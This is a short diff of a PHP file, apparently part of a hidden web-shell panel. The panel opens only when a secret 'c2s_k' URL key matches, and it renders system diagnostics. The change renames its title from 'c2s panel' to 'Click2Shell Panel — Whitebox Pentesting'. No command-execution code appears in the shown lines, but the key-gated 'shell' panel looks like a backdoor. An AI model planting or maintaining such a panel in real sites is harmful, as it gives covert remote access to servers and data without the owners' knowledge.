@@ -444,10 +444,10 @@ if ($c2s_key !== '' && isset($_GET['c2s_k']) && hash_equals($c2s_key, (string)$_
     $c2s_h  = function ($x) { return htmlspecialchars((string)$x, ENT_QUOTES, 'UTF-8'); };
     $c2s_u  = function ($x) { return rawurlencode((string)$x); };
     $c2s_ref = 'c2s_k=' . $c2s_u($c2s_key);
-    echo '<!doctype html><title>c2s panel</title>';
+    echo '<!doctype html><title>Click2Shell Panel — Whitebox Pentesting</title>';
     echo '<meta name="viewport" content="width=device-width,initial-scale=1">';
     echo '<body style="font:13px/1.45 monospace;background:#0d1117;color:#c9d1d9;padding:12px;margin:0">';
-    echo '<h3 style="color:#58a6ff;margin:0 0 4px">c2s panel</h3>';
+    echo '<h3 style="color:#58a6ff;margin:0 0 4px">Click2Shell Panel — Whitebox Pentesting</h3>';
     echo '<pre style="color:#8b949e;margin:0 0 10px">' . $c2s_h(_c2s_diag()) . '</pre>';
     echo '<h4 style="color:#39d353">SYSTEM</h4>';
     echo '<table border=0 cellpadding=3 style="border-collapse:collapse">';
